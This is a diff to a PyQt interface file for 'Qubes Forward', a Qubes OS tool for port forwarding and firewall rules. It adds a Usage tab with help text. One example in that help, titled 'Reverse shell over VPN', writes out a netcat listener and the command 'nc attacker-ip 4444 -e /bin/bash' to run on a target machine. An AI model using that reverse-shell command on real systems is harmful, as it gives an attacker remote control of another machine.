@@ -131,6 +131,9 @@ class Ui_Form(object):
         self.gridLayout_5.setObjectName("gridLayout_5")
         self.verticalLayout_4 = QtWidgets.QVBoxLayout()
         self.verticalLayout_4.setObjectName("verticalLayout_4")
+        self.textBrowser_2 = QtWidgets.QTextBrowser(parent=self.tab_4)
+        self.textBrowser_2.setObjectName("textBrowser_2")
+        self.verticalLayout_4.addWidget(self.textBrowser_2)
         self.gridLayout_5.addLayout(self.verticalLayout_4, 0, 0, 1, 1)
         self.tabWidget.addTab(self.tab_4, "")
         self.gridLayout_2.addWidget(self.tabWidget, 0, 1, 1, 1)
@@ -143,8 +146,6 @@ class Ui_Form(object):
         _translate = QtCore.QCoreApplication.translate
         Form.setWindowTitle(_translate("Form", "Qubes Forward"))
         self.tableWidget.setSortingEnabled(True)
-        item = self.tableWidget.horizontalHeaderItem(0)
-        item.setText(_translate("Form", " "))
         item = self.tableWidget.horizontalHeaderItem(1)
         item.setText(_translate("Form", "From Qube"))
         item = self.tableWidget.horizontalHeaderItem(2)
@@ -159,8 +160,6 @@ class Ui_Form(object):
         self.PortForwarding_New.setText(_translate("Form", "New"))
         self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab), _translate("Form", "Port forwarding"))
         self.tableWidget_2.setSortingEnabled(True)
-        item = self.tableWidget_2.horizontalHeaderItem(0)
-        item.setText(_translate("Form", " "))
         item = self.tableWidget_2.horizontalHeaderItem(1)
         item.setText(_translate("Form", "Qube"))
         item = self.tableWidget_2.horizontalHeaderItem(2)
@@ -182,4 +181,20 @@ class Ui_Form(object):
 "<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><br /></p>\n"
 "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">Made with ❤️ by r3t4k3r</p></body></html>"))
         self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_3), _translate("Form", "About"))
+        self.textBrowser_2.setHtml(_translate("Form", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
+"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
+"p, li { white-space: pre-wrap; }\n"
+"</style></head><body style=\" font-family:\'Sans\'; font-size:10pt; font-weight:400; font-style:normal;\">\n"
+"<h3 style=\" margin-top:14px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:large; font-weight:600;\">Tabs</span></h3>\n"
+"<h4 style=\" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:medium; font-weight:600;\">Port Forwarding</span></h4>\n"
+"<p style=\" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">You can easy forwarding any TCP port between 2 qubes</p>\n"
+"<h4 style=\" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:medium; font-weight:600;\">Firewall</span></h4>\n"
+"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">By default Qubes OS deny any connections outside the world, for example, if you\'ll try to open <span style=\" font-family:\'monospace\';\">0.0.0.0:8000</span> in <span style=\" font-family:\'monospace\';\">sys-net</span>, you still haven\'t access. Here you can fix that limitation. </p>\n"
+"<h4 style=\" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:medium; font-weight:600;\">About</span></h4>\n"
+"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">Donation tab </p>\n"
+"<h3 style=\" margin-top:14px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:large; font-weight:600;\">Some exmples</span></h3>\n"
+"<h4 style=\" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:medium; font-weight:600;\">Start web server on personal:8000 and access for it using moble in the same wifi network</span></h4>\n"
+"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">Run <span style=\" font-family:\'monospace\';\">python -m http.server 8000</span> in <span style=\" font-family:\'monospace\';\">personal</span> qube. Add port forward rule: <span style=\" font-family:\'monospace\';\">personal:8000 =&gt; sys-net:1337</span> after that open port in firewall tab <span style=\" font-family:\'monospace\';\">sys-net:1337</span>. On the mobile device in browser open <span style=\" font-family:\'monospace\';\">http://your-laptop-ip:1337</span></p>\n"
+"<h4 style=\" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:medium; font-weight:600;\">Reverse shell over VPN</span></h4>\n"
+"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">Run <span style=\" font-family:\'monospace\';\">sudo nc -lvp 4444</span> in <span style=\" font-family:\'monospace\';\">personal</span> qube. Add firewall rule <span style=\" font-family:\'monospace\';\">personal:4444</span>. Access to your shell from target machine <span style=\" font-family:\'monospace\';\">nc attacker-ip 4444 -e /bin/bash</span></p></body></html>"))
         self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_4), _translate("Form", "Usage"))
